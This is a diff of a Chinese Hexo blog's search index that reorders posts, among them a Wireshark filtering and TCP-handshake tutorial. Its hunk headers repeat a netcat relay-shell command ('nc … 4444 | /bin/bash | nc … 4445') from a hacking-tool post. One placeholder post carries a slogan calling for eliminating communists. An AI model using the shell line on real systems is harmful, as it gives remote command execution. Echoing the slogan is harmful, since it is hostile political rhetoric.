@@ -1,27 +1,44 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2023/04/01/hello-world/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span>
-</code></pre>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server
-</code></pre>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate
-</code></pre>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy
-</code></pre>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+    <title>wireshark抓包新手使用教程</title>
+    <url>/2023/05/24/wireshark-zhua-bao-xin-shou-shi-yong-jiao-cheng/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1、wireshark启动后，wireshark处于抓包状态中。"><a href="#1、wireshark启动后，wireshark处于抓包状态中。" class="headerlink" title="1、wireshark启动后，wireshark处于抓包状态中。"></a>1、wireshark启动后，wireshark处于抓包状态中。</h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/w1.png"></p>
+<h2 id="2、执行需要抓包的操作，如在cmd窗口下执行ping-www-baidu-com。"><a href="#2、执行需要抓包的操作，如在cmd窗口下执行ping-www-baidu-com。" class="headerlink" title="2、执行需要抓包的操作，如在cmd窗口下执行ping www.baidu.com。"></a>2、执行需要抓包的操作，如在cmd窗口下执行ping <a href="http://www.baidu.com./">www.baidu.com。</a></h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/202306031609424.png"></p>
+<p>操作完成后相关数据包就抓取到了。为避免其他无用的数据包影响分析，可以通过在过滤栏设置过滤条件进行数据包列表过滤，获取结果如下。说明：ip.addr &#x3D;&#x3D; 119.75.217.26 and icmp 表示只显示ICPM协议且源主机IP或者目的主机IP为119.75.217.26的数据包。说明：协议名称icmp要小写。</p>
+<h2 id="3、Wireshakr抓包界面介绍"><a href="#3、Wireshakr抓包界面介绍" class="headerlink" title="3、Wireshakr抓包界面介绍"></a>3、Wireshakr抓包界面介绍</h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/202306031626223.png"></p>
+<h2 id="4、WireShark-主要分为这几个界面"><a href="#4、WireShark-主要分为这几个界面" class="headerlink" title="4、WireShark 主要分为这几个界面"></a>4、WireShark 主要分为这几个界面</h2><p>Display Filter(显示过滤器)， 用于设置过滤条件进行数据包列表过滤。菜单路径：Analyze –&gt; Display Filters。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/202306031634706.png"></p>
+<p>Packet List Pane(数据包列表)， 显示捕获到的数据包，每个数据包包含编号，时间戳，源地址，目标地址，协议，长度，以及数据包信息。 不同协议的数据包使用了不同的颜色区分显示。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031649468.png"></p>
+<p>Packet Details Pane(数据包详细信息), 在数据包列表中选择指定数据包，在数据包详细信息中会显示数据包的所有详细信息内容。数据包详细信息面板是最重要的，用来查看协议中的每一个字段。各行信息分别为</p>
+<p> （1）Frame:  物理层的数据帧概况</p>
+<p> （2）Ethernet II: 数据链路层以太网帧头部信息</p>
+<p> （3）Internet Protocol Version 4: 互联网层IP包头部信息</p>
+<p> （4）Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP</p>
+<p> （5）Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031653476.png"></p>
+<h2 id="5、TCP包的具体内容"><a href="#5、TCP包的具体内容" class="headerlink" title="5、TCP包的具体内容"></a>5、TCP包的具体内容</h2><p> 从下图可以看到wireshark捕获到的TCP包中的每个字段。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031659629.png"></p>
+<h3 id="ip过滤"><a href="#ip过滤" class="headerlink" title="ip过滤"></a>ip过滤</h3><p>  ip.src &#x3D;&#x3D;192.168.1.104 显示源地址为192.168.1.104的数据包列表</p>
+<p>  ip.dst&#x3D;&#x3D;192.168.1.104, 显示目标地址为192.168.1.104的数据包列表</p>
+<p>  ip.addr &#x3D;&#x3D; 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031725106.png"></p>
+<h3 id="端口过滤"><a href="#端口过滤" class="headerlink" title="端口过滤"></a>端口过滤</h3><p> tcp.port &#x3D;&#x3D;80, 显示源主机或者目的主机端口为80的数据包列表。</p>
+<p> tcp.srcport &#x3D;&#x3D; 80, 只显示TCP协议的源主机端口为80的数据包列表。</p>
+<p> tcp.dstport &#x3D;&#x3D; 80，只显示TCP协议的目的主机端口为80的数据包列表。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031727211.png"></p>
+<h2 id="Wireshark抓包分析TCP三次握手"><a href="#Wireshark抓包分析TCP三次握手" class="headerlink" title="Wireshark抓包分析TCP三次握手"></a>Wireshark抓包分析TCP三次握手</h2><p>（1）TCP三次握手连接建立过程</p>
+<p>  Step1：客户端发送一个SYN&#x3D;1，ACK&#x3D;0标志的数据包给服务端，请求进行连接，这是第一次握手；</p>
+<p>  Step2：服务端收到请求并且允许连接的话，就会发送一个SYN&#x3D;1，ACK&#x3D;1标志的数据包给发送端，告诉它，可以通讯了，并且让客户    端发送一个确认数据包，这是第二次握手；</p>
+<p>  Step3：服务端发送一个SYN&#x3D;0，ACK&#x3D;1的数据包给客户端端，告诉它连接已被确认，这就是第三次握手。TCP连接建立，开始通讯。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031719627.png"></p>
 ]]></content>
       <categories>
-        <category>渗透工具</category>
+        <category>黑客工具</category>
       </categories>
       <tags>
-        <tag>sqlmap工具</tag>
+        <tag>wireshark</tag>
       </tags>
   </entry>
   <entry>
@@ -76,46 +93,6 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
       </categories>
       <tags>
         <tag>netcat</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>linux</title>
-    <url>/2022/08/12/linux/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
-<blockquote>
-<p>Linux 内核最初只是由芬兰人林纳斯·托瓦兹（Linus Torvalds）在赫尔辛基大学上学时出于个人爱好而编写的。</p>
-</blockquote>
-</blockquote>
-<p>Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统。</p>
-<p>Linux 能运行主要的 UNIX 工具软件、应用程序和网络协议。它支持 32 位和 64 位硬件。Linux 继承了 Unix 以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p>
-<pre class=" language-bash"><code class="language-bash">$ hexo server
-</code></pre>
-<p><img src="https://t7.baidu.com/it/u=3930750564,2979238085&fm=193&f=GIF" alt="这是封面"></p>
-<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.jj20.com%2Fup%2Fallimg%2F4k%2Fs%2F02%2F210924223450D25-0-lp.jpg&refer=http%3A%2F%2Fimg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1662899151&t=c4b3dc1cbeb0fff8b0988f565417991e" alt="看看这个能成功不"></p>
-<div id="dplayer0" class="dplayer" style="margin-bottom: 20px;"></div><script>var dplayer0 = new DPlayer({"element":document.getElementById("dplayer0"),"autoplay":0,"theme":"#FADFA3","loop":1,"video":{"url":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.mp4","pic":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.jpg"},"danmaku":{"api":"https://api.prprpr.me/dplayer3/","id":"9E2E3368B56CDBB4","token":"tokendemo","addition":["https://api.prprpr.me/dplayer3/v2/bilibili?aid"]}});</script><!-- dplayer used1 -->  
-<div id="dplayer1" class="dplayer" style="margin-bottom: 20px;"></div><script>var dplayer1 = new DPlayer({"element":document.getElementById("dplayer1"),"autoplay":1,"video":{"url":"some.mp4"},"danmaku":{"api":"https://api.prprpr.me/dplayer/","id":"someid","addition":["/some.json"]}});</script><!-- dplayer used1 -->]]></content>
-      <categories>
-        <category>操作系统</category>
-      </categories>
-      <tags>
-        <tag>kali Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python</title>
-    <url>/2022/08/12/python/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Python（英國發音：&#x2F;ˈpaɪθən&#x2F; 美國發音：&#x2F;ˈpaɪθɑːn&#x2F;），是一种广泛使用的解释型、高级和通用的编程语言。 </p>
-<p>Python支持多种编程范型，包括函数式、指令式、反射式、结构化和面向对象编程。 </p>
-<p>它拥有动态类型系统和垃圾回收功能，能够自动管理内存使用，并且其本身拥有一个巨大而广泛的标准库。</p>
-<div class="video-container"><iframe   src=https://www.youtube.com/embed/Mgbwi6Sii7g?rel=0&amp;showinfo=0 frameborder=0 gesture=media allow=encrypted-media allowfullscreen></iframe></div>
-
-<div class="video-container"><iframe   src=https://www.youtube.com/embed/rXwJwubqVmI title=YouTube video player frameborder=0 allow=accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share allowfullscreen></iframe></div>
-]]></content>
-      <categories>
-        <category>编程</category>
-      </categories>
-      <tags>
-        <tag>编程语言</tag>
       </tags>
   </entry>
   <entry>
@@ -174,6 +151,18 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
       </tags>
   </entry>
   <entry>
+    <title>我的第二篇文章</title>
+    <url>/2023/04/01/wo-de-di-er-pian-wen-zhang/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的第二篇文章"><a href="#我的第二篇文章" class="headerlink" title="我的第二篇文章"></a>我的第二篇文章</h1><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/12345.jpg" alt="经典图片"></p>
+]]></content>
+      <categories>
+        <category>渗透工具</category>
+      </categories>
+      <tags>
+        <tag>sqlmap工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>我的博客试试看</title>
     <url>/2023/04/01/wo-de-bo-ke-shi-shi-kan/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="灭共是正义的必须"><a href="#灭共是正义的必须" class="headerlink" title="灭共是正义的必须"></a>灭共是正义的必须</h1><h2 id="可以卑微入尘土，不可扭曲入蛆虫！"><a href="#可以卑微入尘土，不可扭曲入蛆虫！" class="headerlink" title="可以卑微入尘土，不可扭曲入蛆虫！"></a>可以卑微入尘土，不可扭曲入蛆虫！</h2><p>非常棒，很棒，很好</p>
@@ -188,9 +177,21 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
       </tags>
   </entry>
   <entry>
-    <title>我的第二篇文章</title>
-    <url>/2023/04/01/wo-de-di-er-pian-wen-zhang/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的第二篇文章"><a href="#我的第二篇文章" class="headerlink" title="我的第二篇文章"></a>我的第二篇文章</h1><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/12345.jpg" alt="经典图片"></p>
+    <title>Hello World</title>
+    <url>/2023/04/01/hello-world/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span>
+</code></pre>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server
+</code></pre>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate
+</code></pre>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy
+</code></pre>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
       <categories>
         <category>渗透工具</category>
@@ -200,44 +201,43 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
       </tags>
   </entry>
   <entry>
-    <title>wireshark抓包新手使用教程</title>
-    <url>/2023/05/24/wireshark-zhua-bao-xin-shou-shi-yong-jiao-cheng/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1、wireshark启动后，wireshark处于抓包状态中。"><a href="#1、wireshark启动后，wireshark处于抓包状态中。" class="headerlink" title="1、wireshark启动后，wireshark处于抓包状态中。"></a>1、wireshark启动后，wireshark处于抓包状态中。</h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/w1.png"></p>
-<h2 id="2、执行需要抓包的操作，如在cmd窗口下执行ping-www-baidu-com。"><a href="#2、执行需要抓包的操作，如在cmd窗口下执行ping-www-baidu-com。" class="headerlink" title="2、执行需要抓包的操作，如在cmd窗口下执行ping www.baidu.com。"></a>2、执行需要抓包的操作，如在cmd窗口下执行ping <a href="http://www.baidu.com./">www.baidu.com。</a></h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/202306031609424.png"></p>
-<p>操作完成后相关数据包就抓取到了。为避免其他无用的数据包影响分析，可以通过在过滤栏设置过滤条件进行数据包列表过滤，获取结果如下。说明：ip.addr &#x3D;&#x3D; 119.75.217.26 and icmp 表示只显示ICPM协议且源主机IP或者目的主机IP为119.75.217.26的数据包。说明：协议名称icmp要小写。</p>
-<h2 id="3、Wireshakr抓包界面介绍"><a href="#3、Wireshakr抓包界面介绍" class="headerlink" title="3、Wireshakr抓包界面介绍"></a>3、Wireshakr抓包界面介绍</h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/202306031626223.png"></p>
-<h2 id="4、WireShark-主要分为这几个界面"><a href="#4、WireShark-主要分为这几个界面" class="headerlink" title="4、WireShark 主要分为这几个界面"></a>4、WireShark 主要分为这几个界面</h2><p>Display Filter(显示过滤器)， 用于设置过滤条件进行数据包列表过滤。菜单路径：Analyze –&gt; Display Filters。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/202306031634706.png"></p>
-<p>Packet List Pane(数据包列表)， 显示捕获到的数据包，每个数据包包含编号，时间戳，源地址，目标地址，协议，长度，以及数据包信息。 不同协议的数据包使用了不同的颜色区分显示。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031649468.png"></p>
-<p>Packet Details Pane(数据包详细信息), 在数据包列表中选择指定数据包，在数据包详细信息中会显示数据包的所有详细信息内容。数据包详细信息面板是最重要的，用来查看协议中的每一个字段。各行信息分别为</p>
-<p> （1）Frame:  物理层的数据帧概况</p>
-<p> （2）Ethernet II: 数据链路层以太网帧头部信息</p>
-<p> （3）Internet Protocol Version 4: 互联网层IP包头部信息</p>
-<p> （4）Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP</p>
-<p> （5）Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议</p>
-<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031653476.png"></p>
-<h2 id="5、TCP包的具体内容"><a href="#5、TCP包的具体内容" class="headerlink" title="5、TCP包的具体内容"></a>5、TCP包的具体内容</h2><p> 从下图可以看到wireshark捕获到的TCP包中的每个字段。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031659629.png"></p>
-<h3 id="ip过滤"><a href="#ip过滤" class="headerlink" title="ip过滤"></a>ip过滤</h3><p>  ip.src &#x3D;&#x3D;192.168.1.104 显示源地址为192.168.1.104的数据包列表</p>
-<p>  ip.dst&#x3D;&#x3D;192.168.1.104, 显示目标地址为192.168.1.104的数据包列表</p>
-<p>  ip.addr &#x3D;&#x3D; 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表</p>
-<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031725106.png"></p>
-<h3 id="端口过滤"><a href="#端口过滤" class="headerlink" title="端口过滤"></a>端口过滤</h3><p> tcp.port &#x3D;&#x3D;80, 显示源主机或者目的主机端口为80的数据包列表。</p>
-<p> tcp.srcport &#x3D;&#x3D; 80, 只显示TCP协议的源主机端口为80的数据包列表。</p>
-<p> tcp.dstport &#x3D;&#x3D; 80，只显示TCP协议的目的主机端口为80的数据包列表。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031727211.png"></p>
-<h2 id="Wireshark抓包分析TCP三次握手"><a href="#Wireshark抓包分析TCP三次握手" class="headerlink" title="Wireshark抓包分析TCP三次握手"></a>Wireshark抓包分析TCP三次握手</h2><p>（1）TCP三次握手连接建立过程</p>
-<p>  Step1：客户端发送一个SYN&#x3D;1，ACK&#x3D;0标志的数据包给服务端，请求进行连接，这是第一次握手；</p>
-<p>  Step2：服务端收到请求并且允许连接的话，就会发送一个SYN&#x3D;1，ACK&#x3D;1标志的数据包给发送端，告诉它，可以通讯了，并且让客户    端发送一个确认数据包，这是第二次握手；</p>
-<p>  Step3：服务端发送一个SYN&#x3D;0，ACK&#x3D;1的数据包给客户端端，告诉它连接已被确认，这就是第三次握手。TCP连接建立，开始通讯。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031719627.png"></p>
+    <title>python</title>
+    <url>/2022/08/12/python/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Python（英國發音：&#x2F;ˈpaɪθən&#x2F; 美國發音：&#x2F;ˈpaɪθɑːn&#x2F;），是一种广泛使用的解释型、高级和通用的编程语言。 </p>
+<p>Python支持多种编程范型，包括函数式、指令式、反射式、结构化和面向对象编程。 </p>
+<p>它拥有动态类型系统和垃圾回收功能，能够自动管理内存使用，并且其本身拥有一个巨大而广泛的标准库。</p>
+<div class="video-container"><iframe   src=https://www.youtube.com/embed/Mgbwi6Sii7g?rel=0&amp;showinfo=0 frameborder=0 gesture=media allow=encrypted-media allowfullscreen></iframe></div>
+
+<div class="video-container"><iframe   src=https://www.youtube.com/embed/rXwJwubqVmI title=YouTube video player frameborder=0 allow=accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share allowfullscreen></iframe></div>
 ]]></content>
       <categories>
-        <category>黑客工具</category>
+        <category>编程</category>
       </categories>
       <tags>
-        <tag>wireshark</tag>
+        <tag>编程语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux</title>
+    <url>/2022/08/12/linux/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
+<blockquote>
+<p>Linux 内核最初只是由芬兰人林纳斯·托瓦兹（Linus Torvalds）在赫尔辛基大学上学时出于个人爱好而编写的。</p>
+</blockquote>
+</blockquote>
+<p>Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统。</p>
+<p>Linux 能运行主要的 UNIX 工具软件、应用程序和网络协议。它支持 32 位和 64 位硬件。Linux 继承了 Unix 以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p>
+<pre class=" language-bash"><code class="language-bash">$ hexo server
+</code></pre>
+<p><img src="https://t7.baidu.com/it/u=3930750564,2979238085&fm=193&f=GIF" alt="这是封面"></p>
+<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.jj20.com%2Fup%2Fallimg%2F4k%2Fs%2F02%2F210924223450D25-0-lp.jpg&refer=http%3A%2F%2Fimg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1662899151&t=c4b3dc1cbeb0fff8b0988f565417991e" alt="看看这个能成功不"></p>
+<div id="dplayer0" class="dplayer" style="margin-bottom: 20px;"></div><script>var dplayer0 = new DPlayer({"element":document.getElementById("dplayer0"),"autoplay":0,"theme":"#FADFA3","loop":1,"video":{"url":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.mp4","pic":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.jpg"},"danmaku":{"api":"https://api.prprpr.me/dplayer3/","id":"9E2E3368B56CDBB4","token":"tokendemo","addition":["https://api.prprpr.me/dplayer3/v2/bilibili?aid"]}});</script><!-- dplayer used1 -->  
+<div id="dplayer1" class="dplayer" style="margin-bottom: 20px;"></div><script>var dplayer1 = new DPlayer({"element":document.getElementById("dplayer1"),"autoplay":1,"video":{"url":"some.mp4"},"danmaku":{"api":"https://api.prprpr.me/dplayer/","id":"someid","addition":["/some.json"]}});</script><!-- dplayer used1 -->]]></content>
+      <categories>
+        <category>操作系统</category>
+      </categories>
+      <tags>
+        <tag>kali Linux</tag>
       </tags>
   </entry>
 </search>
